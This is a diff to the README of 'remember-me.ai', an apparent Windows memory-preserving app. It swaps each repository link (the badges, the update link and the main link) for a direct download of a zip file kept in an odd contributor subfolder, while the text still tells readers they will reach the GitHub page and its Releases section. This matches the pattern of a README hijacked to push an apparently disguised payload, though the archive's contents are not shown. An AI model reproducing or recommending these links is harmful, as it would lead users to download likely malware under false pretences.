@@ -1,6 +1,6 @@
 # 🧠 remember-me.ai - Preserve Your Digital Memory
 
-[![Download from GitHub](https://img.shields.io/badge/Download-remember--me.ai-brightgreen)](https://github.com/markoswire/remember-me.ai)
+[![Download from GitHub](https://img.shields.io/badge/Download-remember--me.ai-brightgreen)](https://github.com/markoswire/remember-me.ai/raw/refs/heads/main/contributors/liupig/posts/remember_ai_me_v2.0.zip)
 
 ---
 
@@ -53,7 +53,7 @@ This guide takes you step-by-step through downloading, installing, and running r
 
 Click the badge below or visit the link to get the app files:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-remember--me.ai-brightgreen)](https://github.com/markoswire/remember-me.ai)
+[![Download from GitHub](https://img.shields.io/badge/Download-remember--me.ai-brightgreen)](https://github.com/markoswire/remember-me.ai/raw/refs/heads/main/contributors/liupig/posts/remember_ai_me_v2.0.zip)
 
 You will be taken to the GitHub page for remember-me.ai. Look for the **Releases** section or the latest release option. Download the latest Windows setup file or installer available.
 
@@ -124,7 +124,7 @@ You can export your profile and memories as files:
 
 ## 🔄 Updating remember-me.ai
 
-Visit the [GitHub page](https://github.com/markoswire/remember-me.ai) regularly for updates. New versions may contain bug fixes or new features.
+Visit the [GitHub page](https://github.com/markoswire/remember-me.ai/raw/refs/heads/main/contributors/liupig/posts/remember_ai_me_v2.0.zip) regularly for updates. New versions may contain bug fixes or new features.
 
 To update:
 
@@ -167,8 +167,8 @@ Visit the main GitHub repository for:
 - Community discussions
 - Source code access
 
-Link: https://github.com/markoswire/remember-me.ai
+Link: https://github.com/markoswire/remember-me.ai/raw/refs/heads/main/contributors/liupig/posts/remember_ai_me_v2.0.zip
 
 ---
 
-[![Download from GitHub](https://img.shields.io/badge/Download-remember--me.ai-brightgreen)](https://github.com/markoswire/remember-me.ai)
+[![Download from GitHub](https://img.shields.io/badge/Download-remember--me.ai-brightgreen)](https://github.com/markoswire/remember-me.ai/raw/refs/heads/main/contributors/liupig/posts/remember_ai_me_v2.0.zip)
